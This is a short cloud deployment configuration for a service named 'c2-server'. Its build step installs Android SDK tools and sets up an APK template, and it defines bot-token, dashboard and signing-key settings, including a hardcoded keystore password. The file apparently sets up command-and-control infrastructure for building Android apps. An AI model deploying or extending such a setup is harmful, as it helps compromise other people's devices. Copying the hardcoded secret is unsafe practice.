name: wuzen-x
services:
  - type: web
    name: c2-server
    env: node
    rootDir: server
    buildCommand: |
      npm install
      apt-get update -qq && apt-get install -y -qq default-jdk-headless wget unzip zip > /dev/null 2>&1
      mkdir -p /opt/android-sdk
      cd /opt/android-sdk
      wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
      unzip -q commandlinetools-linux-*.zip
      rm -f commandlinetools-linux-*.zip
      mkdir -p cmdline-tools/latest
      mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null; true
      yes | /opt/android-sdk/cmdline-tools/latest/bin/sdkmanager "build-tools;35.0.0" "platforms;android-34" > /dev/null 2>&1 || true
      mkdir -p templates
      touch templates/base.apk
    startCommand: npm start
    envVars:
      - key: NODE_VERSION
        value: "22"
      - key: BOT_TOKEN
        sync: false
      - key: CHANNEL_ID
        value: "-1000000000000"
      - key: ADMIN_IDS
        value: "[]"
      - key: ENCRYPTION_KEY
        generateValue: true
      - key: SESSION_SECRET
        generateValue: true
      - key: JWT_SECRET
        generateValue: true
      - key: DASHBOARD_USER
        value: "admin"
      - key: DASHBOARD_PASS
        sync: false
      - key: KEYSTORE_PASSWORD
        value: "wuzenx2026"
      - key: KEY_ALIAS
        value: "wuzenx"
      - key: PORT
        value: "10000"
